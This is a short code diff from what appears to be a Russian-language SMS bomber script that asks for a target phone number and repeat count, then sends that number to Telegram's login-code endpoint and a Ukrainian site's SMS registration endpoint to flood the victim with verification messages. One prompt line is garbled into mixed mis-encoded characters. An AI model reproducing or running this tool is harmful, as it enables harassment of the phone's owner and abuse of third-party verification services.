@@ -43,7 +43,6 @@ NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 
 run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
-
  try:
      print('telegram')
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={"phone": "+" + NUMBER})
@@ -82,4 +81,3 @@ run = int(console.input('[green]Введите количество повтор
  try:
      response = requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
  except:
-     time.sleep(5)
